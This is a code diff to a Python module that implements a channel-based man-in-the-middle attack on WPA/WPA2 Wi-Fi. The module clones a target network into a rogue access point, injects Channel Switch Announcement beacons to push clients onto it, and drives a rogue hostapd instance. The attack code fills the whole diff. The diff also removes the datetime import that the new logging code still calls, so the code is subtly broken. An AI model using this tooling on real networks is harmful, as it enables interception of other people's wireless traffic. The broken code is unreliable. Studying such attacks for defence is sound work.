@@ -1,14 +1,16 @@
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
-import sys, os, socket, struct, time, argparse, heapq, subprocess, atexit, select, textwrap
-from datetime import datetime
+import struct, time, subprocess
 from wpaspy import Ctrl
 from packet_processing import *
 from log_messages import *
 
 def print_rx(level, name, p, color=None, suffix=None):
 	'''
+	Module: mitm_code
+	===
+
 	Description: prints the packets received on terminal
 
 	Arguments:
@@ -26,7 +28,10 @@ def print_rx(level, name, p, color=None, suffix=None):
 
 class MitmChannelBased():
 	'''
-	Description: Obtain the configuration of the target network and clone to a Rogue AP
+    Module: mitm_code
+    ===
+
+	Description: Obtain the configuration of the target network, clone to a Rogue AP, configure interfaces and start a new instance of `hostapd` to obtain the MitM Channel Based
 	'''
 	def __init__(self, nic_real, nic_rogue_ap, nic_rogue_mon, ssid, group=False, clientmac=None, dumpfile=None):
 		self.ssid = None
@@ -52,8 +57,15 @@ class MitmChannelBased():
 		self.apmac = None
 		self.netconfig = None
 
+		self.hostapd = None
+		self.hostapd_log = None
+
 	def is_wparsn(self):
 		'''
+		Module: mitm_code
+		===
+		Class: MitmChannelBased
+		---
 		Description: verifies if the target network is WPA or WPA2 protected
 		'''
 		return not self.group_cipher is None and self.wpavers > 0 and \
@@ -63,6 +75,10 @@ class MitmChannelBased():
 	def parse_wparsn(self, wparsn):
 
 		'''
+		Module: mitm_code
+		===
+		Class: MitmChannelBased
+		---
 		Description: obtains information about network security configurations
 
 		Informations obtained:
@@ -91,6 +107,10 @@ class MitmChannelBased():
     #TODO - Change the WMMENABLED from 0 to int(args.group)
 	def from_beacon(self, p):
 		'''
+		Module: mitm_code
+		===
+		Class: MitmChannelBased
+		---
 		Description: obtains a beacon packet from the target network and extracts information from that to clone the Rogue AP
 
 		Arguments:
@@ -127,6 +147,10 @@ class MitmChannelBased():
 	# the returned channel (possible for large networks e.g. eduroam).
 	def find_rogue_channel(self):
 		'''
+		Module: mitm_code
+		===
+		Class: MitmChannelBased
+		---
 		Description: find a new channel for Rogue AP operate
 
 		Rules:
@@ -137,6 +161,10 @@ class MitmChannelBased():
 
 	def write_config(self, iface):
 		'''
+		Module: mitm_code
+		===
+		Class: MitmChannelBased
+		---
 		Description: write the configuration file for `hostapd_rogue.conf`
 
 		Arguments:
@@ -178,15 +206,23 @@ wpa_passphrase=XXXXXXXX"""
 	
 	def create_sockets(self, strict_echo_test=False):
 		'''
+		Module: mitm_code
+		===
+		Class: MitmChannelBased
+		---
 		Configure the sockets on monitor interfaces:
-		  self.sock_real -> self.nic_real
-		  self.sock_rogue -> self.nic_rogue_mon
+		  self.nic_real: self.sock_real
+		  self.nic_rogue_mon: self.sock_rogue
 		'''
 		self.sock_real  = MitmSocket(type=ETH_P_ALL, iface=self.nic_real     , dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
 		self.sock_rogue = MitmSocket(type=ETH_P_ALL, iface=self.nic_rogue_mon, dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
 
 	def find_beacon(self, ssid):
 		'''
+		Module: mitm_code
+		===
+		Class: MitmChannelBased
+		---
 		Description: search for a beacon sent by the target network. First, it searchs on the current channel, if it doesn't found, it starts to search on the other channels.
 
 		Arguments:
@@ -217,10 +253,13 @@ wpa_passphrase=XXXXXXXX"""
 			log(ERROR, "No beacon received of network <%s>. Is monitor mode working? Did you enter the correct SSID?" % self.ssid)
 			exit(1)
 
-
 	def configure_interfaces(self):
 
 		'''
+		Module: mitm_code
+		===
+		Class: MitmChannelBased
+		---
 		Description: configure NIC interfaces to work with MitM Attack
 
 		Interfaces Configured:
@@ -275,6 +314,10 @@ wpa_passphrase=XXXXXXXX"""
 
 	def send_csa_beacon(self, numbeacons=1, newchannel=1, target=None, silent=False):
 		'''
+		Module: mitm_code
+		===
+		Class: MitmChannelBased
+		---
 		Description: it sends `numbeacons` pairs of csa_beacon packets on the network. It takes the beacon sent by the target network and append the CSA element to it. The packet is sent througth the Real Socket.
 
 		Arguments:
@@ -297,3 +340,70 @@ wpa_passphrase=XXXXXXXX"""
 			self.sock_real.send(csabeacon)
 
 		if not silent: log(STATUS, "Injected %d CSA beacon pairs (moving stations to channel %d)" % (numbeacons, newchannel), color="green")	
+	
+	def init_hostapd(self):
+		'''
+		Module: mitm_code
+		===
+		Class: MitmChannelBased
+		---
+		Description: initiate a `hostapd` instance on `nic_rogue_ap` interface
+		'''
+		with open("hostapd_rogue.conf", "w") as fp:
+			fp.write(self.write_config(self.nic_rogue_ap))
+		self.hostapd = subprocess.Popen(["../hostapd/hostapd", "hostapd_rogue.conf", "-dd", "-K"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		self.hostapd_log = open("hostapd_rogue.log", "w")
+		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
+		time.sleep(1)
+
+		self.hostapd_ctrl = Ctrl("hostapd_ctrl/" + self.nic_rogue_ap)
+		self.hostapd_ctrl.attach()
+	
+	def hostapd_rx_mgmt(self, p):
+		'''
+		Module: mitm_code
+		===
+		Class: MitmChannelBased
+		---
+		Description: manage packets sent to hostapd instance
+
+		Arguments:
+		  p: 802.11 packet
+		'''
+		log(DEBUG, "Sent frame to hostapd: %s" % dot11_to_str(p))
+		self.hostapd_ctrl.request("RX_MGMT " + str(p[Dot11]).encode("hex"))
+
+	def hostapd_add_sta(self, macaddr):
+		'''
+		Module: mitm_code
+		===
+		Class: MitmChannelBased
+		---
+		Description: forward authentication packet to Rogue AP sent by the client
+
+		Arguments:
+		  macaddr: the MAC address of the client to register
+		'''
+		log(DEBUG, "Forwarding auth to rouge AP to register client", showtime=False)
+		self.hostapd_rx_mgmt(Dot11(addr1=self.apmac, addr2=macaddr, addr3=self.apmac)/Dot11Auth(seqnum=1))
+
+	def handle_hostapd_out(self):
+		# hostapd always prints lines so this should not block
+		line = self.hostapd.stdout.readline()
+		if line == "":
+			log(ERROR, "Rogue hostapd instances unexpectedly closed")
+			quit(1)
+
+		if line.startswith(">>>> "):
+			log(STATUS, "Rogue hostapd: " + line[5:].strip())
+		elif line.startswith(">>> "):
+			log(DEBUG, "Rogue hostapd: " + line[4:].strip())
+		# This is a bit hacky but very usefull for quick debugging
+		elif "fc=0xc0" in line:
+			log(WARNING, "Rogue hostapd: " + line.strip())
+		elif "sta_remove" in line or "Add STA" in line or "disassoc cb" in line or "disassocation: STA" in line:
+			log(DEBUG, "Rogue hostapd: " + line.strip())
+		else:
+			log(ALL, "Rogue hostapd: " + line.strip())
+
+		self.hostapd_log.write(datetime.now().strftime('[%H:%M:%S] ') + line)
